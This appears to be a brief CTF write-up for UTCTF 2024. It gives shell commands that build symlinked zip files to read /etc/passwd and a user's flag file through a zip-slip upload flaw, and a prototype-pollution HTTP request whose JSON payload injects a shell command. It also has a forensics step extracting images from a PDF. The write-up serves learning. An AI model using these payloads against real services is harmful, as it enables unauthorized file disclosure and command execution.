# UTCTF

```yaml
date: 30-03-2024
```

## Web


### Schrodinger

* Zip slip vulnerability in the file upload functionality
* First see the home directory user name by uploading zipped file as below

```bash
ln -s ../../../../../../../../etc/passwd test
zip --symlinks payload.zip test
```
You'll see that copenhagen is the user name

create next payload using

```bash
ln -s ../../../../../../../../home/copenhagen/flag.txt test
zip --symlinks payload.zip test
```

This will give the flag.

Refer:
<https://infosecwriteups.com/zippy-challenge-writeup-cyberhack-ctf-80eb1d422249>
"
### Easy Mergers v0.1

* Prototype pollution vulnerability in merger.js file

POST /api/absorbCompany/0 HTTP/1.1

```json
{"attributes":["__proto__"],"values":[{"cmd":"cat flag.txt"}]}
```

Refer: <https://portswigger.net/web-security/prototype-pollution>


## Forensics

### Contracts

* install poppler-utils `sudo apt install poppler-utils`
* extract images from the pdf using `pdfimages -all contracts.pdf images/img`
* one of the image displays the flag


